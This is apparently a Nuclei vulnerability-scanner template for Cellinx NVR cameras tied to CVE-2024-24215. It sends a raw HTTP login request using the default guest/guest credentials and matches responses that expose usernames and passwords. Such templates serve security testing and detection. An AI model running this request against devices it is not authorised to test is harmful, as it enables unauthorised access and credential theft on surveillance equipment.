id: Cellinx-NVR-default-login
info:
  name: Template Name
  author: wangzong
  severity: high
  description: 存在Cellinx NVT Web Server信息泄露漏洞
  reference:
    - https://github.com/akyosk/pocman/blob/5d1bbd3cd46b0dc91d44c544bd32d60f2d08625f/cve/Cellinx/CVE_2024_24215.py#L13
  tags: tags
http:
  - raw:
      - |-
        POST /cgi-bin/UAC.cgi?TYPE=json HTTP/1.1
        Host: {{Hostname}}
        Content-Length: 71
        Accept: application/json, text/javascript, */*; q=0.01
        X-Requested-With: XMLHttpRequest
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; ) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.6478.61 Chrome/126.0.6478.61 Not/A)Brand/8  Safari/537.36
        Content-Type: application/json; charset=UTF-8
        Origin: http://{{Hostname}}
        Referer: http://{{Hostname}}/
        Accept-Encoding: gzip, deflate
        Accept-Language: zh-CN,zh;q=0.9
        Cookie: TRACKID=a99035f16b653336f8fe96460f2cf76a; language=en; langCookie=en
        x-real-ip: 127.0.0.1
        x-forwarded-for: 127.0.0.1
        sec-ch-ua-platform: "Windows"
        sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"
        sec-ch-ua-mobile: ?0
        Connection: close

        {"jsonData":{"username":"guest","password":"guest","option":"confirm"}}
    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - password
      - type: word
        part: body
        words:
          - username
